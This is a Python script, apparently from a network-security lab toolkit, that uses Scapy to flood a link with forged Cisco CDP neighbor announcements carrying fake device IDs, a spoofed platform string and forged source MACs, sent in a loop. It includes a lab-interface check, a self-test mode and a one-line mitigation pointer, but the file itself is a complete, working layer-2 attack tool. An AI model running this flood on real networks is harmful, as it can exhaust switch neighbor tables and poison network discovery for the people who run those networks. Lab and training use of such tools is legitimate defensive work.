#!/usr/bin/env python3
"""STP/DISCOVERY: flood forged CDP neighbor announcements. Mitigation:
disable CDP globally or per-interface (see README)."""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from common import base_parser, enforce_lab_iface, require_scapy, status, run_loop, selftest_ok, forged_mac  # noqa: E402


def build_cdp(scapy_all, device_id, platform, n):
    import scapy.contrib.cdp as cdp
    Dot3, LLC, SNAP = scapy_all.Dot3, scapy_all.LLC, scapy_all.SNAP
    hdr = cdp.CDPv2_HDR(msg=[
        cdp.CDPMsgDeviceID(val=("%s-%d" % (device_id, n)).encode()),
        cdp.CDPMsgPortID(iface=b"eth1"),
        cdp.CDPMsgPlatform(val=platform.encode()),
        cdp.CDPMsgCapabilities(cap=0x28),
    ])
    # A valid (non-zero) source MAC is required or the PNetLab link bridge drops
    # the frame before forwarding it to the neighbour — see common.forged_mac().
    return Dot3(dst="01:00:0c:cc:cc:cc", src=forged_mac()) / LLC(dsap=0xAA, ssap=0xAA, ctrl=3) / SNAP(OUI=0xC, code=0x2000) / hdr


def main():
    p = base_parser("Flood forged CDP neighbor announcements")
    p.add_argument("--device_id", default="fake-switch")
    p.add_argument("--platform", default="cisco WS-C2960X")
    args = p.parse_args()
    enforce_lab_iface(args.iface)
    require_scapy()
    import scapy.all as scapy_all

    pkt = build_cdp(scapy_all, args.device_id, args.platform, 0)
    if args.selftest:
        selftest_ok("cdp_flood", "CDP frame len=%d" % len(bytes(pkt)))
        return

    def send(n):
        scapy_all.sendp(build_cdp(scapy_all, args.device_id, args.platform, n), iface=args.iface, verbose=0)
        status("SENT", "CDP #%d device-id=%s-%d platform=%r" % (n + 1, args.device_id, n, args.platform))

    run_loop(args.count, args.interval, send)


if __name__ == "__main__":
    main()

